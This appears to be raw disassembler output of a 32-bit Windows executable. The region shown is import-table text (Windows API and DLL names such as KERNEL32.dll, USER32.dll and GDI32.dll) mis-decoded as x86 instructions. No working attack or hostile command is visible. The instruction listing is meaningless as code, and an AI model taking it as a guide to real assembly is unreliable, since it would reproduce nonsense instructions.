  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
